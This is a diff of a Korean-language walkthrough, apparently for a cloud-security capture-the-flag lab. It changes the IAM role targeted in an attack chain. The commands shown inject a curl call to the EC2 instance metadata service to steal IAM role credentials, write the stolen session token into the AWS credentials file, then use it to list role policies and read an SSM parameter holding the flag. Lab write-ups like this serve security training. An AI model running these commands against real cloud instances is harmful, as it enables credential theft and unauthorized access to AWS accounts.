@@ -37,11 +37,13 @@
 
 `http://ec2주소`
 
-`http://ec2주소?cmd = curl http://169.254.169.254/latest/meta-data/iam/security-credentials/aws_admin_role`
+`http://ec2주소?cmd = curl http://169.254.169.254/latest/meta-data/iam/security-credentials/aws_ssm_role`
 
-`aws configure --profile [aws 관리자]`
+`aws configure --profile [ssmrole_사용자]`
 `echo "aws_session_token = {얻은 토큰}" >> ~/.aws/credentials`
 
-`aws --profile [사용자] sts get-caller-identity`
+`aws --profile [ssmrole_사용자] sts get-caller-identity`
 
-`aws iam list-attached-role-policies --role-name [role_name] --profile [aws 관리자]`
+`aws iam list-attached-role-policies --role-name [role_name] --profile [시작사용자]`
+
+`aws --profile [ssmrole_사용자] ssm get-parameter --name flag`
